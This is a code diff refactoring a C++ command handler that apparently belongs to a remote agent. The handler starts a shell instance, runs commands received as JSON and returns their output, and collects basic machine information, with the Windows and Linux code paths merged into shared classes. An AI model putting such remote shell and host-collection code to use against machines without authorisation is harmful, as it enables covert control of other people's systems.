@@ -2,11 +2,7 @@
 
 #include "CommandHandler.h"
 #include "Logger/GlobalLogger.h"
-#ifdef _WIN32
-#include "collection/system_information/windows_basic_info.hpp"
-#else
-#include "collection/system_information/linux_basic_info.hpp"
-#endif
+#include "Collection/sysinfo.hpp"
 #include <algorithm>
 #include <rapidjson/document.h>
 #include <rapidjson/writer.h>
@@ -69,11 +65,11 @@ std::string CommandHandler::handle(const std::string& commandJson) {
     if (action == START_SHELL_INSTANCE) {
 #ifdef _WIN32
         if (!shell_)
-            shell_ = std::make_unique<win32::Shell>();
+            shell_ = std::make_unique<execution::Shell>();
         shell_running_ = shell_->create_by_sid(L"CURRENT_USER");
 #else
         if (!shell_)
-            shell_ = std::make_unique<linux_os::Shell>();
+            shell_ = std::make_unique<execution::Shell>();
         shell_running_ = shell_->create();
 #endif
         if (!shell_running_) {
@@ -98,20 +94,11 @@ std::string CommandHandler::handle(const std::string& commandJson) {
         }
 
         DARKSCRY_LOG("Run command: " + cmd, Logger::Level::Debug);
-#ifdef _WIN32
         std::string output = shell_->run_command(cmd);
-#else
-        std::string output = shell_->run_command(cmd);
-#endif
         return make_response(true, &output);
     }
-#ifdef _WIN32
     else if (action == GET_BASIC_MACHINE_INFO) {
-        auto info = win32::sysinfo::get_basic_machine_info();
-#else
-    else if (action == GET_BASIC_MACHINE_INFO) {
-        auto info = linux_os::sysinfo::get_basic_machine_info();
-#endif
+        auto info = sysinfo::get_basic_machine_info();
 
         rapidjson::Document d;
         d.SetObject();
